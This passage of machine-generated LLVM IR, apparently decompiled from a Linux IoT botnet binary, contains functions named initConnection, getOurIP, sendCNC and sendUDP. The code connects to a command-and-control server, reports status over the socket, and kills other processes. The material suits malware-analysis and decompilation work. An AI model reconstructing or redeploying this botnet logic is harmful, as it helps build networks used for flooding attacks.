  %v2_804f8b9 = load i32, i32* %v1_804f8a3, align 4
  store i32 %v2_804f8b9, i32* @ebx, align 4
  %v0_804f8bb = call i32 @__libc_getpid()
  %v0_804f8c0 = load i32, i32* @ebx, align 4
  %v7_804f8c0 = icmp ult i32 %v0_804f8c0, %v0_804f8bb
  store i1 %v7_804f8c0, i1* %cf.global-to-local, align 1
  %v12_804f8c0 = icmp eq i32 %v0_804f8c0, %v0_804f8bb
  br i1 %v12_804f8c0, label %dec_label_pc_804f8e7, label %dec_label_pc_804f8c4

dec_label_pc_804f8c4:                             ; preds = %dec_label_pc_804f8a9
  store i32 %v2_804f896, i32* %edx.global-to-local, align 4
  %v0_804f8cc = load i32, i32* @global_var_80617b4.36, align 4
  %v2_804f8d1 = add i32 %v0_804f8cc, %v2_804f896
  %v1_804f8d4 = inttoptr i32 %v2_804f8d1 to i32*
  %v2_804f8d4 = load i32, i32* %v1_804f8d4, align 4
  %v0_804f8d6 = load i32, i32* @esp, align 4
  %v5_804f8d6 = icmp ult i32 %v0_804f8d6, 8
  store i1 %v5_804f8d6, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8d4, i32* %stack_var_-396, align 4
  %v2_804f8dc = call i32 @kill(i32 %v2_804f8d4, i32 9)
  %v0_804f8e1 = load i32, i32* @esp, align 4
  %v2_804f8e1 = icmp ugt i32 %v0_804f8e1, -17
  store i1 %v2_804f8e1, i1* %cf.global-to-local, align 1
  %v4_804f8e4 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804f8e7

dec_label_pc_804f8e7:                             ; preds = %dec_label_pc_804f8a9, %dec_label_pc_804f893, %dec_label_pc_804f8c4
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804f893 ], [ %stack_var_-28.1, %dec_label_pc_804f8a9 ], [ %v4_804f8e4, %dec_label_pc_804f8c4 ]
  %v4_804f8e7 = add i32 %storemerge30, 1
  br label %dec_label_pc_804f8ea

dec_label_pc_804f8ea:                             ; preds = %dec_label_pc_804f8ea.preheader, %dec_label_pc_804f8e7
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804f8e7 ], [ 0, %dec_label_pc_804f8ea.preheader ]
  %storemerge30 = phi i32 [ %v4_804f8e7, %dec_label_pc_804f8e7 ], [ 0, %dec_label_pc_804f8ea.preheader ]
  store i32 0, i32* @edi, align 4
  %v0_804f8fe = load i32, i32* @global_var_805b528.34, align 8
  %v0_804f903 = load i32, i32* @global_var_805b52c.35, align 4
  store i32 %v0_804f903, i32* %edx.global-to-local, align 4
  %v10_804f91b = icmp ne i32 %v0_804f903, 0
  store i1 %v10_804f91b, i1* %cf.global-to-local, align 1
  br i1 %v10_804f91b, label %dec_label_pc_804f893, label %dec_label_pc_804f927

dec_label_pc_804f927:                             ; preds = %dec_label_pc_804f8ea
  store i32 %v0_804f8fe, i32* @esi, align 4
  %v10_804f93b = icmp ult i32 %storemerge30, %v0_804f8fe
  store i1 %v10_804f93b, i1* %cf.global-to-local, align 1
  br i1 %v10_804f93b, label %dec_label_pc_804f893, label %dec_label_pc_804f947

dec_label_pc_804f947:                             ; preds = %dec_label_pc_804f927
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp224 = icmp slt i32 %stack_var_-28.1, 1
  %v0_804f968 = load i32, i32* @global_var_805b520.20, align 32
  %v0_804f96d = load i32, i32* @esp, align 4
  br i1 %tmp224, label %dec_label_pc_804f968, label %dec_label_pc_804f94d

dec_label_pc_804f94d:                             ; preds = %dec_label_pc_804f947
  %v5_804f952 = icmp ult i32 %v0_804f96d, 4
  store i1 %v5_804f952, i1* %cf.global-to-local, align 1
  store i32 %v0_804f968, i32* %stack_var_-396, align 4
  %v2_804f95e = call i32 @sockprintf(i32 %v0_804f968, i32 ptrtoint ([11 x i8]* @global_var_8059144.439 to i32))
  %v0_804f963 = load i32, i32* @esp, align 4
  %v2_804f963 = icmp ugt i32 %v0_804f963, -17
  store i1 %v2_804f963, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f97e

dec_label_pc_804f968:                             ; preds = %dec_label_pc_804f947
  %v5_804f96d = icmp ult i32 %v0_804f96d, 8
  store i1 %v5_804f96d, i1* %cf.global-to-local, align 1
  store i32 %v0_804f968, i32* %stack_var_-396, align 4
  %v2_804f976 = call i32 @sockprintf(i32 %v0_804f968, i32 ptrtoint ([13 x i8]* @global_var_805914f.440 to i32))
  %v0_804f97b = load i32, i32* @esp, align 4
  %v2_804f97b = icmp ugt i32 %v0_804f97b, -17
  store i1 %v2_804f97b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f97e

dec_label_pc_804f97e:                             ; preds = %dec_label_pc_804f838, %dec_label_pc_804f94d, %dec_label_pc_804f968
  %v2_804f981 = load i32, i32* %v1_804e944, align 4
  store i32 10, i32* %stack_var_-364, align 4
  store i1 false, i1* @df, align 1
  %v4_804f99e = inttoptr i32 %v2_804f981 to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_805915c.441 to i32), i32* @edi, align 4
  %v7_804f9b0 = call i32 @_strncmp(i8* %v4_804f99e, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805915c.441, i32 0, i32 0), i32 10)
  %v8_804f9b0 = urem i32 %v7_804f9b0, 2
  %v9_804f9b0 = icmp eq i32 %v8_804f9b0, 0
  %v0_804f9b2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f9b2 = or i1 %v0_804f9b2, %v9_804f9b0
  %v3_804f9b2 = zext i1 %v2_804f9b2 to i32
  %v4_804f9b2 = load i32, i32* @edx, align 4
  %v5_804f9b2 = and i32 %v4_804f9b2, -256
  %v6_804f9b2 = or i32 %v3_804f9b2, %v5_804f9b2
  %v7_804f9b2 = xor i32 %v6_804f9b2, 1
  store i32 %v7_804f9b2, i32* %edx.global-to-local, align 4
  %v1_804f9ba = trunc i32 %v7_804f9b2 to i8
  %v3_804f9ba = zext i1 %v0_804f9b2 to i8
  %v4_804f9ba = sub nsw i8 %v1_804f9ba, %v3_804f9ba
  %v15_804f9ba = icmp eq i8 %v4_804f9ba, 0
  %v2_804f9be = sext i8 %v4_804f9ba to i32
  store i32 %v2_804f9be, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f9c3 = icmp eq i1 %v15_804f9ba, false
  br i1 %v1_804f9c3, label %dec_label_pc_804f9cf, label %dec_label_pc_804f9c5

dec_label_pc_804f9c5:                             ; preds = %dec_label_pc_804f97e
  %v0_804f9c5 = load i32, i32* @esp, align 4
  %v5_804f9c5 = icmp ult i32 %v0_804f9c5, 12
  store i1 %v5_804f9c5, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-396, align 4
  %v1_804f9ca = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804f9cf

dec_label_pc_804f9cf:                             ; preds = %dec_label_pc_804ef30, %dec_label_pc_804ef7c, %dec_label_pc_804f49a, %dec_label_pc_804f474, %dec_label_pc_804f2a8, %dec_label_pc_804f97e, %dec_label_pc_804f80d, %dec_label_pc_804f69b, %dec_label_pc_804f4b7, %dec_label_pc_804f47e, %dec_label_pc_804f39d, %dec_label_pc_804ef9c, %dec_label_pc_804eb2f, %dec_label_pc_804eaa1, %dec_label_pc_804f747, %dec_label_pc_804f5c4, %dec_label_pc_804f0cc, %dec_label_pc_804edfa, %dec_label_pc_804ec9a, %dec_label_pc_804eb64, %dec_label_pc_804e9ea, %dec_label_pc_804e988, %dec_label_pc_804f9c5
  %v0_804f9d6 = phi i32 [ %v1_804f4a6, %dec_label_pc_804f49a ], [ %v2_804f469, %dec_label_pc_804f474 ], [ %v2_804f29d, %dec_label_pc_804f2a8 ], [ %v2_804f9be, %dec_label_pc_804f97e ], [ %v0_804f80d, %dec_label_pc_804f80d ], [ %v0_804f69b, %dec_label_pc_804f69b ], [ %v0_804f4b7, %dec_label_pc_804f4b7 ], [ %v1_804f48a, %dec_label_pc_804f47e ], [ %v0_804f39d, %dec_label_pc_804f39d ], [ %v0_804ef9c, %dec_label_pc_804ef9c ], [ %v0_804eb2f, %dec_label_pc_804eb2f ], [ 0, %dec_label_pc_804eaa1 ], [ %v2_804f755, %dec_label_pc_804f747 ], [ %v2_804f5d2, %dec_label_pc_804f5c4 ], [ %v2_804f0da, %dec_label_pc_804f0cc ], [ %v2_804ee08, %dec_label_pc_804edfa ], [ %v2_804ecbb, %dec_label_pc_804ec9a ], [ %v1_804eb3c, %dec_label_pc_804eb64 ], [ %v2_804e9ff, %dec_label_pc_804e9ea ], [ %v2_804e996, %dec_label_pc_804e988 ], [ %v1_804f9ca, %dec_label_pc_804f9c5 ], [ %v2_804ef3c, %dec_label_pc_804ef30 ], [ %v2_804ef86, %dec_label_pc_804ef7c ]
  %v2_804f9d2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f9d2, i32* @ebx, align 4
  store i32 %v0_804e939, i32* @esi, align 4
  store i32 %v0_804e938, i32* @edi, align 4
  ret i32 %v0_804f9d6

; uselistorder directives
  uselistorder i1 %v0_804f9b2, { 1, 0 }
  uselistorder i32 %v0_804f96d, { 1, 0 }
  uselistorder i32 %v0_804f968, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f8fe, { 1, 0 }
  uselistorder i32 %storemerge30, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804f8d4, { 1, 0 }
  uselistorder i32 %v2_804f896, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804f86c, { 1, 0 }
  uselistorder i32 %v2_804f7fa, { 1, 0 }
  uselistorder i32 %v0_804f7f0, { 1, 0 }
  uselistorder i32 %v2_804f768, { 3, 0, 2, 1 }
  uselistorder i1 %v5_804f737, { 1, 0, 4, 3, 2 }
  uselistorder i1 %v0_804f6fa, { 1, 0 }
  uselistorder i32 %v2_804f688, { 1, 0 }
  uselistorder i32 %v0_804f663, { 1, 0 }
  uselistorder i32 %v0_804f67e, { 1, 0 }
  uselistorder i32 %v2_804f607, { 1, 0 }
  uselistorder i32 %v2_804f5f0, { 1, 0 }
  uselistorder i32 %v2_804f5e5, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804f5c4, { 1, 0 }
  uselistorder i1 %v5_804f5b4, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %v2_804f5b2, { 1, 0 }
  uselistorder i32 %v2_804f59a, { 1, 0 }
  uselistorder i1 %v0_804f577, { 1, 0 }
  uselistorder i1 %v5_804f4a2, { 0, 3, 2, 1 }
  uselistorder i1 %v0_804f45d, { 1, 0 }
  uselistorder i32 %v2_804f40c, { 1, 0 }
  uselistorder i32 %v2_804f3e6, { 1, 0 }
  uselistorder i1 %v5_804f3c8, { 0, 2, 1 }
  uselistorder i32 %v2_804f3c6, { 1, 0 }
  uselistorder i32 %v2_804f3b0, { 1, 0 }
  uselistorder i32 %v2_804f35c, { 1, 0 }
  uselistorder i32 %v2_804f336, { 1, 0 }
  uselistorder i1 %v5_804f318, { 0, 2, 1 }
  uselistorder i32 %v2_804f316, { 1, 0 }
  uselistorder i32 %v2_804f300, { 1, 0 }
  uselistorder i1 %v5_804f2d8, { 1, 0 }
  uselistorder i32 %v2_804f2d6, { 1, 0, 2 }
  uselistorder i32 %v2_804f2b8, { 1, 0 }
  uselistorder i32* %v1_804f2b8, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804f291, { 1, 0 }
  uselistorder i32 %v7_804f28f, { 1, 0 }
  uselistorder i32 %v2_804f217, { 1, 0 }
  uselistorder i32 %v0_804f20d, { 1, 0 }
  uselistorder i1 %v5_804f1af, { 1, 0 }
  uselistorder i32 %v2_804f183, { 1, 0 }
  uselistorder i32 %v2_804f14e, { 1, 0 }
  uselistorder i32 %v2_804f13d, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804f126, { 1, 0 }
  uselistorder i32 %v2_804f10f, { 1, 0 }
  uselistorder i32 %v2_804f0f8, { 1, 0 }
  uselistorder i32 %v2_804f0ed, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804f0cc, { 1, 0 }
  uselistorder i32 %v2_804f0ba, { 1, 0 }
  uselistorder i32 %v2_804f09c, { 1, 0 }
  uselistorder i32 %v1_804f08b, { 1, 0 }
  uselistorder i32 %v1_804f083, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804f07d, { 1, 0 }
  uselistorder i32 %v2_804f064, { 1, 0 }
  uselistorder i1 %v5_804f04d, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i32 %v2_804f04b, { 1, 0 }
  uselistorder i32 %v2_804f02e, { 1, 0 }
  uselistorder i1 %v0_804f007, { 1, 0 }
  uselistorder i32 %v2_804ef86, { 0, 2, 1 }
  uselistorder i1 %v5_804ef1e, { 1, 0 }
  uselistorder i32 %v2_804eef2, { 1, 0 }
  uselistorder i32 %v1_804eec3, { 2, 1, 0 }
  uselistorder i32 %v2_804eebd, { 1, 0 }
  uselistorder i32 %v1_804ee8e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804ee88, { 1, 0 }
  uselistorder i32 %v1_804ee71, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804ee6b, { 1, 0 }
  uselistorder i32 %v2_804ee54, { 1, 0 }
  uselistorder i32 %v2_804ee3d, { 1, 0 }
  uselistorder i32 %v2_804ee26, { 1, 0 }
  uselistorder i32 %v2_804ee1b, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804edfa, { 1, 0 }
  uselistorder i32 %v2_804ede8, { 1, 0 }
  uselistorder i1 %v8_804eddc, { 1, 0, 2 }
  uselistorder i32 %v1_804edd7, { 1, 0 }
  uselistorder i32 %v1_804edcf, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804edc9, { 1, 0 }
  uselistorder i32 %v1_804edbc, { 1, 0 }
  uselistorder i32 %v1_804edb4, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804edae, { 1, 0 }
  uselistorder i32 %v1_804eda1, { 1, 0 }
  uselistorder i32 %v1_804ed99, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804ed93, { 1, 0 }
  uselistorder i32 %v2_804ed7a, { 1, 0 }
  uselistorder i32 %v2_804ed5d, { 1, 0 }
  uselistorder i1 %v5_804ed42, { 1, 0, 15, 14, 12, 11, 10, 9, 13, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804ed40, { 1, 0 }
  uselistorder i32 %v2_804ed23, { 1, 0 }
  uselistorder i1 %v0_804ecfc, { 1, 0 }
  uselistorder i32 %v0_804ecab, { 1, 0, 2 }
  uselistorder i1 %v0_804ec87, { 1, 0 }
  uselistorder i32 %v0_804ec2c, { 1, 0, 2 }
  uselistorder i1 %v0_804ebff, { 1, 0 }
  uselistorder i32 %v0_804eb92, { 1, 0, 2 }
  uselistorder i1 %v0_804eb18, { 1, 0 }
  uselistorder i32 %v0_804eac1, { 1, 0 }
  uselistorder i32 %v0_804eaa1, { 1, 0, 2 }
  uselistorder i1 %v0_804ea8e, { 1, 0 }
  uselistorder i1 %v0_804ea40, { 1, 0 }
  uselistorder i32 %v0_804e9ef, { 1, 0, 2 }
  uselistorder i1 %v0_804e9d7, { 1, 0 }
  uselistorder i32 %v0_804e988, { 1, 0 }
  uselistorder i1 %v0_804e975, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32* %stack_var_-380, { 3, 0, 51, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 2, 52, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 4, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %stack_var_-396, { 4, 5, 6, 7, 3, 0, 46, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 2, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 %tmp188, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 2, 0 }
  uselistorder i32 %tmp160, { 2, 18, 3, 17, 4, 16, 5, 15, 0, 14, 6, 7, 13, 8, 9, 1, 12, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9, 11, 10, 12, 13, 16, 14, 15, 17, 18, 20, 19, 21, 22, 23 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 14, 2, 3, 4, 5, 6, 7, 13, 8, 9, 10, 11, 12, 15, 212, 16, 17, 18, 23, 19, 20, 21, 22, 213, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 214, 37, 38, 39, 45, 40, 41, 42, 43, 44, 215, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 218, 70, 71, 72, 73, 74, 75, 83, 76, 77, 78, 79, 80, 81, 82, 219, 84, 85, 86, 87, 88, 216, 89, 90, 91, 96, 92, 93, 94, 95, 217, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 211, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 167, 127, 128, 132, 129, 130, 131, 220, 133, 134, 135, 136, 137, 138, 139, 210, 140, 141, 209, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 168, 172, 169, 170, 171, 173, 179, 174, 175, 176, 177, 178, 180, 197, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 198, 201, 199, 200, 202, 205, 203, 204, 206, 207, 208 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8058c11.306 to i32), { 8, 0, 7, 1, 6, 2, 5, 3, 9, 4, 10, 11 }
  uselistorder label %dec_label_pc_804f9cf, { 22, 5, 6, 14, 7, 15, 8, 2, 9, 3, 10, 4, 16, 11, 1, 0, 17, 18, 19, 12, 13, 20, 21 }
  uselistorder label %dec_label_pc_804f97e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8ea, { 1, 0 }
  uselistorder label %dec_label_pc_804f8e7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f7c9, { 1, 0 }
  uselistorder label %dec_label_pc_804f747, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f6c6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f646, { 1, 0 }
  uselistorder label %dec_label_pc_804f5c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f543, { 1, 0 }
  uselistorder label %dec_label_pc_804f429, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f2f1, { 1, 0 }
  uselistorder label %dec_label_pc_804f25d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804f1da, { 1, 0 }
  uselistorder label %dec_label_pc_804f1a3, { 1, 0 }
  uselistorder label %dec_label_pc_804f16e, { 1, 0 }
  uselistorder label %dec_label_pc_804f0e7, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f0cc, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804ef49, { 1, 0 }
  uselistorder label %dec_label_pc_804ef12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804edfa, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804eae1, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_804f9e0 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804f9f4 = bitcast i32* %stack_var_-4104 to i8*
  %v4_804f9f4 = call i32 @__GI_memset(i8* %v3_804f9f4, i32 0, i32 4096)
  %v0_804f9fc = load i32, i32* @global_var_805b520.20, align 32
  %v1_804fa01 = icmp eq i32 %v0_804f9fc, 0
  br i1 %v1_804fa01, label %dec_label_pc_804fa20, label %dec_label_pc_804fa05

dec_label_pc_804fa05:                             ; preds = %entry
  %v1_804fa0e = call i32 @__libc_close(i32 %v0_804f9fc)
  store i32 0, i32* @global_var_805b520.20, align 32
  br label %dec_label_pc_804fa20

dec_label_pc_804fa20:                             ; preds = %entry, %dec_label_pc_804fa05
  %v0_804fa20 = load i32, i32* @global_var_805b19c.442, align 4
  %v1_804fa25 = icmp eq i32 %v0_804fa20, 0
  %v1_804fa27 = icmp eq i1 %v1_804fa25, false
  br i1 %v1_804fa27, label %dec_label_pc_804fa35, label %dec_label_pc_804fa40

dec_label_pc_804fa35:                             ; preds = %dec_label_pc_804fa20
  %v1_804fa3a = add i32 %v0_804fa20, 1
  br label %dec_label_pc_804fa40

dec_label_pc_804fa40:                             ; preds = %dec_label_pc_804fa20, %dec_label_pc_804fa35
  %storemerge = phi i32 [ %v1_804fa3a, %dec_label_pc_804fa35 ], [ 0, %dec_label_pc_804fa20 ]
  store i32 %storemerge, i32* @global_var_805b19c.442, align 4
  %v1_804fa45 = mul i32 %storemerge, 4
  %v2_804fa45 = add i32 %v1_804fa45, ptrtoint ([16 x i8]** @global_var_805b198.443 to i32)
  %v3_804fa45 = inttoptr i32 %v2_804fa45 to i32*
  %v4_804fa45 = load i32, i32* %v3_804fa45, align 4
  store i32 %v4_804fa45, i32* @eax, align 4
  %v3_804fa57 = call i32 @strcpy(i8* %v3_804f9f4, i32 %v4_804fa45)
  %v3_804fa72 = call i32 @__GI_strchr(i8* %v3_804f9f4, i32 58)
  %v1_804fa7a = icmp eq i32 %v3_804fa72, 0
  br i1 %v1_804fa7a, label %dec_label_pc_804fab9, label %dec_label_pc_804fa7e

dec_label_pc_804fa7e:                             ; preds = %dec_label_pc_804fa40
  %v3_804fa8a = call i32 @__GI_strchr(i8* %v3_804f9f4, i32 58)
  %v1_804fa92 = add i32 %v3_804fa8a, 1
  %v1_804fa97 = call i32 @atol(i32 %v1_804fa92)
  %v3_804faae = call i32 @__GI_strchr(i8* %v3_804f9f4, i32 58)
  %v4_804faae = inttoptr i32 %v3_804faae to i8*
  store i8 0, i8* %v4_804faae, align 1
  br label %dec_label_pc_804fab9

dec_label_pc_804fab9:                             ; preds = %dec_label_pc_804fa40, %dec_label_pc_804fa7e
  %stack_var_-8.0 = phi i32 [ 23, %dec_label_pc_804fa40 ], [ %v1_804fa97, %dec_label_pc_804fa7e ]
  %v3_804fac2 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804fac2, i32* @global_var_805b520.20, align 32
  %v4_804fae2 = call i32 @connectTimeout(i32 %v3_804fac2, i32 %v2_804f9e0, i32 %stack_var_-8.0, i32 30)
  %v1_804faea = icmp eq i32 %v4_804fae2, 0
  %. = zext i1 %v1_804faea to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804fab9, { 1, 0 }
  uselistorder label %dec_label_pc_804fa40, { 1, 0 }
  uselistorder label %dec_label_pc_804fa20, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_804fb1e = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804fb29 = icmp eq i32 %v5_804fb1e, -1
  %v1_804fb2d = icmp eq i1 %v13_804fb29, false
  br i1 %v1_804fb2d, label %dec_label_pc_804fb3e, label %dec_label_pc_804fd01

dec_label_pc_804fb3e:                             ; preds = %entry
  %v2_804fb3e = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804fb6a = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8059166.444 to i32))
  %v2_804fb7a = call i32 @htons(i32 53)
  %v5_804fb92 = call i32 @__libc_connect(i32 %v5_804fb1e, i32 %v2_804fb3e, i32 16)
  %v13_804fb9d = icmp eq i32 %v5_804fb92, -1
  %v1_804fba1 = icmp eq i1 %v13_804fb9d, false
  br i1 %v1_804fba1, label %dec_label_pc_804fbb2, label %dec_label_pc_804fd01

dec_label_pc_804fbb2:                             ; preds = %dec_label_pc_804fb3e
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804fbb9 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804fbbf = ptrtoint i32* %stack_var_-60 to i32
  %v5_804fbc7 = call i32 @__GI_getsockname(i32 %v5_804fb1e, i32 %v2_804fbb9, i32 %v2_804fbbf)
  %v13_804fbd2 = icmp eq i32 %v5_804fbc7, -1
  %v1_804fbd6 = icmp eq i1 %v13_804fbd2, false
  br i1 %v1_804fbd6, label %dec_label_pc_804fbe7, label %dec_label_pc_804fd01

dec_label_pc_804fbe7:                             ; preds = %dec_label_pc_804fbb2
  %v5_804fbf9 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805916e.445, i32 0, i32 0), i32 0)
  %v2_804fc5c = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804fc6e51 = call i32 @fdgets(i32 %v2_804fc5c, i32 4096, i32 %v5_804fbf9)
  %v1_804fc7652 = icmp eq i32 %v5_804fc6e51, 0
  %v1_804fc7853 = icmp eq i1 %v1_804fc7652, false
  br i1 %v1_804fc7853, label %dec_label_pc_804fc06, label %dec_label_pc_804fc7a

dec_label_pc_804fc06:                             ; preds = %dec_label_pc_804fbe7, %dec_label_pc_804fc40
  %v5_804fc15 = call i32 @strstr(i32 %v2_804fc5c, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805917e.446, i32 0, i32 0))
  %v1_804fc1d = icmp eq i32 %v5_804fc15, 0
  br i1 %v1_804fc1d, label %dec_label_pc_804fc40, label %dec_label_pc_804fc2f.preheader

dec_label_pc_804fc2f.preheader:                   ; preds = %dec_label_pc_804fc06
  %v2_804fc3242 = load i8, i8* %stack_var_-4156, align 1
  %v10_804fc3447 = icmp eq i8 %v2_804fc3242, 9
  %v1_804fc3648 = icmp eq i1 %v10_804fc3447, false
  br i1 %v1_804fc3648, label %dec_label_pc_804fc2c, label %dec_label_pc_804fc38

dec_label_pc_804fc2c:                             ; preds = %dec_label_pc_804fc2f.preheader, %dec_label_pc_804fc2c
  %v4_804fc2f49 = phi i32 [ %v5_804fc2c, %dec_label_pc_804fc2c ], [ %v2_804fc5c, %dec_label_pc_804fc2f.preheader ]
  %v5_804fc2c = add i32 %v4_804fc2f49, 1
  %v22_804fc2c = inttoptr i32 %v5_804fc2c to i8*
  %v2_804fc32 = load i8, i8* %v22_804fc2c, align 1
  %v10_804fc34 = icmp eq i8 %v2_804fc32, 9
  %v1_804fc36 = icmp eq i1 %v10_804fc34, false
  br i1 %v1_804fc36, label %dec_label_pc_804fc2c, label %dec_label_pc_804fc38

dec_label_pc_804fc38:                             ; preds = %dec_label_pc_804fc2c, %dec_label_pc_804fc2f.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_804fc2f.preheader ], [ %v22_804fc2c, %dec_label_pc_804fc2c ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_804fc7a

dec_label_pc_804fc40:                             ; preds = %dec_label_pc_804fc06
  %v6_804fc54 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804fc6e = call i32 @fdgets(i32 %v2_804fc5c, i32 4096, i32 %v5_804fbf9)
  %v1_804fc76 = icmp eq i32 %v5_804fc6e, 0
  %v1_804fc78 = icmp eq i1 %v1_804fc76, false
  br i1 %v1_804fc78, label %dec_label_pc_804fc06, label %dec_label_pc_804fc7a

dec_label_pc_804fc7a:                             ; preds = %dec_label_pc_804fbe7, %dec_label_pc_804fc40, %dec_label_pc_804fc38
  %v2_804fc80 = call i32 @__libc_close(i32 %v5_804fbf9)
  %v3_804fc88 = load i8, i8* %stack_var_-4156, align 1
  %v4_804fc8e = icmp eq i8 %v3_804fc88, 0
  br i1 %v4_804fc8e, label %dec_label_pc_804fcf1, label %dec_label_pc_804fc92

dec_label_pc_804fc92:                             ; preds = %dec_label_pc_804fc7a
  %v2_804fc9c = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804fc9c, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804fca3 = call i32 @strcpy(i8* %tmp39, i32 %v2_804fc5c)
  %v5_804fcbd = call i32 @ioctl(i32 %v5_804fb1e, i32 35111, i32 %v2_804fc9c)
  %v2_804fcd7 = ptrtoint i32* %stack_var_-4170 to i32
